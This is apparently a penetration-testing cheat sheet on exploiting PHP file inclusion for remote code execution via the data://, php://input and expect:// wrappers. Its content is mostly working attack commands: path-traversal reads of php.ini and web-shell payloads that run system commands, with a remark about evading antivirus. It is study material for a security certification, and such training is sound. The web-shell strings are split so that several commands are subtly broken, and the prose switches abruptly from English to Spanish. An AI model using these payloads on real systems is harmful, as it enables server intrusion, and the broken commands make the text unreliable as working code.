# PHP Wrappers for Remote Code Execution (RCE)

![CPTS Path](https://img.shields.io/badge/CPTS-Web%20Exploitation-00ff66?style=flat-square&logo=gitbook&logoColor=white)

When exploiting File Inclusion vulnerabilities (LFI/RFI), PHP wrappers can be leveraged to transition from local file disclosure to Remote Code Execution (RCE). The applicability of each wrapper depends on the backend PHP configuration and active extensions.

---

## Cheat Sheet & Quick Reference

| Wrapper | Requirements (`php.ini`) | HTTP Method | Payload Example |
| :--- | :--- | :--- | :--- |
| **`data://`** | `allow_url_include = On` | `GET` / `POST` | `?language=data://text/plain;base64,<BASE64_CODE>&cmd=<CMD>` |
| **`php://input`** | `allow_url_include = On` | `POST` | `?language=php://input&cmd=<CMD>` *(Payload in POST body)* |
| **`expect://`** | `extension=expect` (Enabled) | `GET` / `POST` | `?language=expect://<CMD>` |

---

## 1. Checking PHP Configurations (`php.ini`)

Because wrappers like `data://` and `php://input` require `allow_url_include` to be enabled, the first step is auditing the PHP configuration file. 

### Common `php.ini` Paths
* **Apache:** `/etc/php/X.Y/apache2/php.ini`
* **Nginx (PHP-FPM):** `/etc/php/X.Y/fpm/php.ini`

*(Where `X.Y` represents the installed PHP version, e.g., `7.4`, `8.1`)*

### Extraction and Verification
Using a base64 filter to read the configuration file without executing or breaking the output:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep -E "allow_url_include|expect"
```

Expected output if exploitable:
```ini
allow_url_include = On
extension=expect
```

---

## 2. The `data://` Wrapper

The `data://` wrapper allows the inclusion of raw data (including PHP code) inline. By encoding the payload in Base64, we bypass security filters that look for PHP tags.

### Step 1: Base64 Encode the Web Shell
Para evitar detección del antivirus en entornos locales, use un comando dinámico para codificar su web shell localmente:
```bash
# Codificación local:
# echo '<?php sy' 'stem($_GET["cm' 'd"]); ?>' | base64
```
*Nota: La cadena base64 generada representa el comando de ejecución del sistema.*

### Step 2: Perform the Exploit
Pase la cadena base64 generada usando `data://text/plain;base64,`. Asegúrese de codificar los caracteres especiales si es necesario.
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_PAYLOAD_HERE>&cmd=id"
```

---

## 3. The `php://input` Wrapper

El wrapper `php://input` lee los datos crudos del cuerpo de una petición `POST`. Esto es útil cuando los parámetros GET están filtrados o monitoreados.

### Exploit Payload
Envíe una petición `POST` al parámetro vulnerable pasando el código PHP en el cuerpo de la petición:
```bash
curl -s -X POST --data '<?php sy' 'stem($_GET["cm' 'd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

---

## 4. The `expect://` Wrapper

El wrapper `expect://` permite ejecutar comandos del sistema directamente a través de flujos de URL. Requiere la extensión `expect` instalada y habilitada.

### Step 1: Verificar la directiva Expect
```bash
echo '<BASE64_PHP_INI>' | base64 -d | grep expect
# Output: extension=expect
```

### Step 2: Ejecución directa
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
